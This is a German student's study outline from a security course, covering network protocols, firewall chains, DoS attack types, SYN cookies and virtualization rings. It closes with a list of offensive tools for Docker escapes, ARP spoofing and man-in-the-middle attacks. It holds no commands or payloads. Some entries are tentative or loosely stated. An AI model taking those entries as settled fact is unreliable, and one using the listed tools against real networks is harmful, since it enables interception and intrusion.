            - ![](local://C:/Users/hoisc/remnote/remnote-63d97e1a4bbc4c8b7b51bea4/files/ZPXsUpgjxqJ5vWjlBw18RQyRzGpao9H8wAfYl_m-tLVDu3OAgc7s5QYiaJ7UZsKUsPpcvLOzu_yIrtarbnX1_ivvr_SlOF7iycBLlnVzTKMs3jOw3WHwaHUGRF-a5__F.png)
            - ![](local://C:/Users/hoisc/remnote/remnote-63d97e1a4bbc4c8b7b51bea4/files/WgtHKFqyDofWWD3PmnJDqFTdxEE4L0m6integuUCDIo4KbZNf0YFhc93BOmhA_zCaVoXr1un5udIs2-a11Ss-LbpgecVhuGLe0AkX4uQejNzXFgXyuv44gNWUGYDswu6.png)
            - 
            - ![](local://C:/Users/hoisc/remnote/remnote-63d97e1a4bbc4c8b7b51bea4/files/Rj5lLhr9Q8jpUMG0k-cfMyoNmmN1byVefQLyC87HZ711WO2je9Uvcpzqpxs_32wnR88HSoAgqwa02GQJrJ7w31JUt-XcqPAiJGr1YWgj8NYlUb8ITKZSsaB6W95B6A16.png)
        - Security Goals
            - CIA
            - Nicht Abstreitbarkeit? 
        - TCP/IP Stack
            - Phy
            - Link
                - Ethernet
                - ALOHA (MAC)
            - Internet
                - IPv4/6
            - Transport
                - TCP
                - UDP
            - Application
                - HTTP(S)
                    - 80
                    - 443
                - SSH
                    - 22
                - SMTP
                    - 25
                - 465
                - iMAP 143
                - iMAPS 993
                - Mails
            - (siehe Folie)
        - Networking: Link
            - IPv4
                - (Unter Umständen EAP - nicht erwartet)
                - DHCP request (Broadcast) 
                    - Dynamic Host Configuration Protocol
                    - (Offer zurück (Unicast))
                    - (Ack)
                    - ⇒ Gateway (keine Details; Router reicht)
                    - ⇒ DNS
            - IPv6 
                - SLAAC - Stateless Auto Configuration
                    - MAC + UUID (irgendwie vom OS)
                    - Neighbour Solicitation, um herauszufinden, ob unsere gewählte Adresse doch schon existiert (NDP)
                - Router solicitation (Broadcast) (NDP - Address checking )
                    - Globale ipv6 Adresse ⇒ min. 2 Adressen
                    - Optional: DHCPv6 möglich - Deterministisch
                    - NDP macht was genau?
                    - Mehrere Router in einem Netz möglich
                    - 
        - Firewalls NACHARBEITEN
            - Jede für Chain eine sinnvolle Routing Regel (Routing, Forward nur für Pakete, die weitergeleitet werden / NAT chains)
                - Prerouting (Vor dem Routen muss etwas gemacht werden obvs.)
                    - steht in NAT-Tabelle; sollte man nicht filtern
                    - DNAT passiert wohl hier 
                - Forward
                    - Hier wird gefiltert?
                - Postrouting (Wenn Paket wieder zurück kommt, muss sourceaddress verändert werden (anscheinend))
                    - SNAT passiert wohl hier (Quelladressen werden verändert)
                    - existiert, damit wir in forwarding noch nach source filtern können. Wenn wir in prerouting diese schon geändert hätten, wär das schwer
                - Input
                    - Beliebiger Protokoll Traffic allow/deny
                    - Beliebige allow list rules
                - Output
                    - Beliebige Ziel-IPs blocken
        - Networking: DoS Protection
            - What can cause DoS
                - Network saturation
                    - Packets must be dropped
                - Physical
                    - Cable spoofing
                    - ...
                - Link
                    - ARP spoofing
                - Internet
                    - DHCP spoofing
                    - NDP spoofing
                - DNS amplification
                - SYN flooding
                - Slow Loris
                    - Bsp.: Webserver viele parallele Anfragen, gerade so am leben halten und Sockets / Resourcen blocken
                - Denial Of Sleep
            - SYN Cookies (Preventing SYN flooding)
                - Am ACK kann man erkennen, ob SYN Ack vorher gesendet wurde und man spart sich Tabellen lookup (oder so?) 
                    - Link darf nicht saturiert sein
                    - (Macht ip spoofing schwer, weil State-Tabellen für ongoing connections beim Angreifer existieren müssten)
        - Virtualisierung
            - Sandboxing
                - Ringe sind Hardware-Privilegienlevel
                - -1 Hypervisor: Managed mehrere Kernels; Damit Ressourcen korrekt virtualisiert werden
                    - Verhindert Seiteneffekte und fördert Isolation
                - 0 für Kernel full power
                - 1,2 basically deprecated, nur für driver und zeugs
                - 3 für User Space der kann nichts
            - Typen (Siehe Folien)
                - Application
                - OS
                - "Full"
                    - Paravirtualisierung
                        - Gast OS weiß, dass es virtualisiert ist
                        - Hardware Details fallen weg?
- 
- TOOLS
    - General
        - [CiP Toolbox - HedgeDoc](https://hd.platypwnies.de/CiP23-Toolbox?isPin=false?aliasId=0xYtuxXGFVxT3R9Un)
        - [Notion – The all-in-one workspace for your notes, tasks, wikis, and databases.](https://linuskoester.notion.site/97fa30a4dee149a295522272232f4a2a?v=d5ba1447ffe44c9089eb118571a9a301)
            - kann man sich auch lokal in notion clonen
    - Reversing
        - Ghidra
        - GDB
        - PWNTOOLS
    - Docker Escapes
        - Linpeas ([PEASS-ng/linPEAS at master · carlospolop/PEASS-ng · GitHub](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS?aliasId=todbZTFAmZBfFAaTf?isPin=false) )
    - Network Fuckery
        - Bettercap
        - MITMProxy
        - Arpspoof
- 
